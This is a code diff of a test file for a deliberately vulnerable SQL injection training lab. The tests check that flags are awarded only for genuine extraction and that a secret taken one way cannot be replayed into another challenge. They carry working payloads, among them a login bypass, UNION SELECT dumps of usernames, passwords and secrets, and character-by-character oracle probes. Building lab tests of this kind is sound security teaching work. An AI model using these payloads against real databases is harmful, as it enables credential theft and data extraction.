@@ -6,6 +6,7 @@
 const test = require('node:test');
 const assert = require('node:assert/strict');
 const path = require('node:path');
+const crypto = require('node:crypto');
 const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');
 
 const MOD = 'sqli';
@@ -19,6 +20,20 @@ function adminSecretFromDb(dataDir) {
   const row = db.prepare("SELECT secret FROM users WHERE username = 'admin'").get();
   db.close();
   return row.secret;
+}
+
+// P0-8: each rebound challenge (blind, like-wildcard, groupby-having,
+// order-by, limit-offset) has its own derived target, computed from the
+// admin secret exactly the way modules/sqli/shared.js derives it. Tests read
+// it from the throwaway DB only, to assert oracle extractions land on the
+// right per-challenge value and that replays fail.
+function derivedTargetFromDb(dataDir, challengeId) {
+  const admin = adminSecretFromDb(dataDir);
+  const hex = crypto.createHash('sha256')
+    .update(`${admin}|sqli-target:${challengeId}`, 'utf8')
+    .digest('hex')
+    .slice(0, 32);
+  return `PENTRIX{${hex}}`;
 }
 
 function assertNoFlag(text, label) {
@@ -123,8 +138,12 @@ test('sqli module', async (t) => {
     assert.deepEqual(await sqliCaptured(c), []);
 
     // Fake shortcut: the real seeded admin credentials, no injection involved.
+    // They must still LOG IN (advertised demo credentials always work, P1-8),
+    // just without earning the flag.
     const realCreds = await c.post('/sqli/login', { username: 'admin', password: 'admin123' });
     assertNoFlag(realCreds.text, '/sqli/login real admin creds');
+    assert.ok(realCreds.text.includes('Signed in'), 'the real admin credentials must log in');
+    assert.ok(!realCreds.text.includes('Invalid username or password'), 'a correct credential login must not read Invalid');
     assert.deepEqual(await sqliCaptured(c), []);
 
     const bypass = await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
@@ -152,7 +171,7 @@ test('sqli module', async (t) => {
     assert.ok((await sqliCaptured(c)).includes('sqli:UNION-based Injection'));
   });
 
-  await t.test('blind: a wrong guess earns nothing, the oracle-extracted secret earns the flag', async () => {
+  await t.test('blind: a wrong guess earns nothing, the oracle-extracted challenge secret earns the flag', async () => {
     const c = client(srv.base);
     const formPage = await c.get('/sqli/product?id=1');
     assert.equal(formPage.status, 200);
@@ -162,13 +181,15 @@ test('sqli module', async (t) => {
     assertNoFlag(wrong.text, '/sqli/blind-submit wrong guess');
     assert.deepEqual(await sqliCaptured(c), []);
 
+    // P0-8: this challenge's own derived target, exposed to injected SQL as
+    // sqli_target(); the oracle interrogates it character by character.
     const probeAt = async (pos, ch) => {
-      const id = `0' OR (SELECT substr(secret,${pos},1) FROM users WHERE username='admin') <= '${ch}' -- `;
+      const id = `0' OR substr(sqli_target(),${pos},1) <= '${ch}' -- `;
       const r = await c.get(`/sqli/product?id=${encodeURIComponent(id)}`);
       return r.text.includes('Product exists.');
     };
     const extracted = await extractSecretHex(probeAt);
-    assert.equal(extracted, adminSecretFromDb(dataDir), 'boolean-oracle extraction must match the real admin secret');
+    assert.equal(extracted, derivedTargetFromDb(dataDir, 'blind'), 'boolean-oracle extraction must match the derived blind target');
 
     const hit = await c.post('/sqli/blind-submit', { secret: extracted });
     assert.equal(hit.status, 200);
@@ -192,7 +213,7 @@ test('sqli module', async (t) => {
     assert.ok((await sqliCaptured(c)).includes('sqli:Error-based Injection'));
   });
 
-  await t.test('order-by: a plain sort column earns nothing, a CASE WHEN oracle against users earns the flag', async () => {
+  await t.test('order-by: a plain sort column and the old pattern award earn nothing, the CASE WHEN oracle extracts the challenge secret', async () => {
     const c = client(srv.base);
     const benign = await c.get(`/sqli/sort?sort=${encodeURIComponent('price DESC')}`);
     assert.equal(benign.status, 200);
@@ -200,11 +221,36 @@ test('sqli module', async (t) => {
     assertNoFlag(benign.text, '/sqli/sort benign');
     assert.deepEqual(await sqliCaptured(c), []);
 
-    const payload = "CASE WHEN (SELECT substr(secret,1,1) FROM users WHERE username='admin')='P' THEN name ELSE price END -- ";
-    const hit = await c.get(`/sqli/sort?sort=${encodeURIComponent(payload)}`);
+    // P0-8 regression guard: the pre-fix award fired on this exact pattern
+    // (CASE WHEN keywords plus a users reference) with zero extraction.
+    const pattern = await c.get(`/sqli/sort?sort=${encodeURIComponent("CASE WHEN (SELECT substr(secret,1,1) FROM users WHERE username='admin')='P' THEN name ELSE price END -- ")}`);
+    assert.equal(pattern.status, 200);
+    assertNoFlag(pattern.text, '/sqli/sort pattern-only payload');
+    assert.deepEqual(await sqliCaptured(c), []);
+
+    // Genuine solve: the row order is the oracle. Probe the derived target
+    // (exposed to injected SQL as sqli_target()) one character at a time.
+    // The true branch orders by id (first row: the hoodie), the false branch
+    // by name (first row: the archived prototype), so the two answers are
+    // always distinguishable.
+    const firstRowName = async (expr) => {
+      const r = await c.get(`/sqli/sort?sort=${encodeURIComponent(expr)}`);
+      const m = r.text.match(/<tbody>\s*<tr><td>\d+<\/td><td>\d+<\/td><td>([^<]*)<\/td>/);
+      assert.ok(m, 'sorted table must render a first row');
+      return m[1];
+    };
+    const idOrderFirst = await firstRowName('CASE WHEN 1=1 THEN id ELSE name END');
+    const probeAt = async (pos, ch) => {
+      const expr = `CASE WHEN substr(sqli_target(),${pos},1) <= '${ch}' THEN id ELSE name END`;
+      return (await firstRowName(expr)) === idOrderFirst;
+    };
+    const extracted = await extractSecretHex(probeAt);
+    assert.equal(extracted, derivedTargetFromDb(dataDir, 'order-by'), 'CASE WHEN oracle extraction must match the derived order-by target');
+
+    const hit = await c.post('/sqli/sort/submit', { secret: extracted });
     assert.equal(hit.status, 200);
     assert.ok(hit.text.includes(flagOf('order-by')));
-    assertStyled(hit.text, '/sqli/sort oracle result');
+    assertStyled(hit.text, '/sqli/sort/submit result');
     assert.ok((await sqliCaptured(c)).includes('sqli:ORDER BY Injection'));
   });
 
@@ -228,7 +274,7 @@ test('sqli module', async (t) => {
     assert.ok((await sqliCaptured(c)).includes('sqli:Second-Order SQL Injection'));
   });
 
-  await t.test('like-wildcard: a wrong guess earns nothing, the LIKE oracle-extracted secret earns the flag', async () => {
+  await t.test('like-wildcard: a wrong guess earns nothing, the LIKE oracle-extracted challenge secret earns the flag', async () => {
     const c = client(srv.base);
     const baseline = await c.get('/sqli/wildcard?q=');
     assert.equal(baseline.status, 200);
@@ -240,14 +286,15 @@ test('sqli module', async (t) => {
     assertNoFlag(wrong.text, '/sqli/wildcard/submit wrong guess');
     assert.deepEqual(await sqliCaptured(c), []);
 
+    // P0-8: interrogate this challenge's own derived target via sqli_target().
     const probeAt = async (pos, ch) => {
-      const q = `' AND (SELECT substr(secret,${pos},1) FROM users WHERE username='admin') <= '${ch}' -- `;
+      const q = `' AND substr(sqli_target(),${pos},1) <= '${ch}' -- `;
       const r = await c.get(`/sqli/wildcard?q=${encodeURIComponent(q)}`);
       const m = r.text.match(/<b>(\d+)<\/b> of (\d+) products match/);
       return !!m && Number(m[1]) === total;
     };
     const extracted = await extractSecretHex(probeAt);
-    assert.equal(extracted, adminSecretFromDb(dataDir), 'LIKE-oracle extraction must match the real admin secret');
+    assert.equal(extracted, derivedTargetFromDb(dataDir, 'like-wildcard'), 'LIKE-oracle extraction must match the derived like-wildcard target');
 
     const hit = await c.post('/sqli/wildcard/submit', { secret: extracted });
     assert.equal(hit.status, 200);
@@ -256,7 +303,7 @@ test('sqli module', async (t) => {
     assert.ok((await sqliCaptured(c)).includes('sqli:LIKE Wildcard Exfiltration'));
   });
 
-  await t.test('limit-offset: a plain numeric limit earns nothing, LIMIT syntax injection earns the flag', async () => {
+  await t.test('limit-offset: a plain numeric limit earns nothing, LIMIT syntax injection pulls the hidden target row into view', async () => {
     const c = client(srv.base);
     const benign = await c.get('/sqli/paged?limit=2');
     assert.equal(benign.status, 200);
@@ -264,14 +311,24 @@ test('sqli module', async (t) => {
     assertNoFlag(benign.text, '/sqli/paged benign');
     assert.deepEqual(await sqliCaptured(c), []);
 
+    // P0-8: a plain numeric limit, even one that reveals the hidden row,
+    // earns nothing; only LIMIT-syntax injection extracts the target.
+    // (The revealed target is itself flag-shaped text, so assert the
+    // challenge flag value is absent rather than counting flag shapes.)
+    const numeric = await c.get('/sqli/paged?limit=100');
+    assert.equal(numeric.status, 200);
+    assert.ok(!numeric.text.includes(flagOf('limit-offset')), 'numeric limit must not award limit-offset');
+    assert.deepEqual(await sqliCaptured(c), []);
+
     const hit = await c.get('/sqli/paged?limit=-1');
     assert.equal(hit.status, 200);
+    assert.ok(hit.text.includes(derivedTargetFromDb(dataDir, 'limit-offset')), 'hidden target row must be pulled into view');
     assert.ok(hit.text.includes(flagOf('limit-offset')));
     assertStyled(hit.text, '/sqli/paged limit-syntax result');
     assert.ok((await sqliCaptured(c)).includes('sqli:LIMIT/OFFSET Injection'));
   });
 
-  await t.test('groupby-having: a plain grouping column earns nothing, grouping by a subquery leaks the admin secret', async () => {
+  await t.test('groupby-having: a plain grouping column and a quoted literal earn nothing, grouping by sqli_target() leaks the challenge secret', async () => {
     const c = client(srv.base);
     const benign = await c.get('/sqli/stats?by=region');
     assert.equal(benign.status, 200);
@@ -279,7 +336,17 @@ test('sqli module', async (t) => {
     assertNoFlag(benign.text, '/sqli/stats benign');
     assert.deepEqual(await sqliCaptured(c), []);
 
-    const hit = await c.get(`/sqli/stats?by=${encodeURIComponent("(SELECT secret FROM users WHERE username='admin')")}`);
+    // P0-8 regression guard: the pre-fix award fired for a quoted literal of
+    // the (UNION-extracted) admin secret. A literal can never match this
+    // challenge's derived target. (assertNoFlag is unusable here: the page
+    // echoes the submitted expression, and the admin secret is itself
+    // flag-shaped, so assert the challenge flag value is absent instead.)
+    const literal = await c.get(`/sqli/stats?by=${encodeURIComponent(`(SELECT '${adminSecretFromDb(dataDir)}')`)}`);
+    assert.equal(literal.status, 200);
+    assert.ok(!literal.text.includes(flagOf('groupby-having')), 'quoted literal of the admin secret must not award groupby-having');
+    assert.deepEqual(await sqliCaptured(c), []);
+
+    const hit = await c.get(`/sqli/stats?by=${encodeURIComponent('(SELECT sqli_target())')}`);
     assert.equal(hit.status, 200);
     assert.ok(hit.text.includes(flagOf('groupby-having')));
     assertStyled(hit.text, '/sqli/stats group-by result');
@@ -328,7 +395,7 @@ test('sqli module', async (t) => {
     await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
     await c.get(`/sqli/detail?id=${encodeURIComponent("1'")}`);
     await c.get('/sqli/paged?limit=-1');
-    await c.get(`/sqli/stats?by=${encodeURIComponent("(SELECT secret FROM users WHERE username='admin')")}`);
+    await c.get(`/sqli/stats?by=${encodeURIComponent('(SELECT sqli_target())')}`);
     await c.get(`/sqli/shop?q=${encodeURIComponent("' UnIoN SELECT id,username,password,secret FROM users-- ")}`);
     const got = (await sqliCaptured(c)).length;
     assert.equal(got, 6);
@@ -336,5 +403,66 @@ test('sqli module', async (t) => {
     await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'x' });
     await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
     assert.equal((await sqliCaptured(c)).length, 6, 'repeating the exploits must not double count');
+  });
+
+  // P0-8 / P0-10 adversarial: one genuine extraction (the admin secret via
+  // UNION) must NOT unlock the other challenges. Every replay below uses
+  // adversarial input (the real secret, another challenge's real target, a
+  // quoted literal), never benign placeholders.
+  await t.test('FLAG BAR: secrets extracted via one technique cannot be replayed into another challenge', async () => {
+    const c = client(srv.base);
+    const unionHit = await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT id,username,password,secret FROM users-- ")}`);
+    assert.ok(unionHit.text.includes(flagOf('union')), 'setup: the UNION exploit itself must work');
+    const onlyUnion = ['sqli:UNION-based Injection'];
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
+
+    const admin = adminSecretFromDb(dataDir);
+
+    // The UNION-extracted admin secret replayed into the blind submit box.
+    const blindReplay = await c.post('/sqli/blind-submit', { secret: admin });
+    assertNoFlag(blindReplay.text, 'admin secret replayed into blind-submit');
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
+
+    // The UNION-extracted admin secret replayed into the LIKE submit box.
+    const likeReplay = await c.post('/sqli/wildcard/submit', { secret: admin });
+    assertNoFlag(likeReplay.text, 'admin secret replayed into wildcard-submit');
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
+
+    // The UNION-extracted admin secret replayed into the ORDER BY submit box.
+    const sortReplay = await c.post('/sqli/sort/submit', { secret: admin });
+    assertNoFlag(sortReplay.text, 'admin secret replayed into sort-submit');
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
+
+    // A quoted literal of the admin secret as the GROUP BY expression.
+    // (The page echoes the submitted expression and the admin secret is
+    // flag-shaped, so assert the challenge flag value is absent rather than
+    // counting flag-shaped matches.)
+    const literal = await c.get(`/sqli/stats?by=${encodeURIComponent(`(SELECT '${admin}')`)}`);
+    assert.ok(!literal.text.includes(flagOf('groupby-having')), 'quoted literal of the admin secret in groupby-having');
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
+
+    // The flag-shaped function name smuggled in a string literal must not
+    // count as an invocation either.
+    const smuggled = await c.get(`/sqli/stats?by=${encodeURIComponent("(SELECT 'sqli_target()')")}`);
+    assertNoFlag(smuggled.text, 'sqli_target name smuggled inside a literal in groupby-having');
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
+
+    // One challenge's real derived target replayed into another's submit box.
+    const blindTarget = derivedTargetFromDb(dataDir, 'blind');
+    const crossBox = await c.post('/sqli/wildcard/submit', { secret: blindTarget });
+    assertNoFlag(crossBox.text, 'blind target replayed into wildcard-submit');
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
+    const crossBox2 = await c.post('/sqli/sort/submit', { secret: blindTarget });
+    assertNoFlag(crossBox2.text, 'blind target replayed into sort-submit');
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
+
+    // sqli_target() evaluated outside its own challenge yields NULL: the
+    // UNION challenge cannot mint another challenge's target. (The page
+    // renders the catalog rows, including the hidden limit-offset row whose
+    // description is flag-shaped, so assert on the wanted flag value rather
+    // than counting flag-shaped matches.)
+    const foreign = await c.get(`/sqli/products?q=${encodeURIComponent("' UNION SELECT 1,sqli_target(),1,1-- ")}`);
+    assert.ok(!foreign.text.includes(flagOf('blind')), 'sqli_target() via the UNION challenge must not reveal the blind flag');
+    assert.deepEqual(await sqliCaptured(c), onlyUnion);
   });
 });
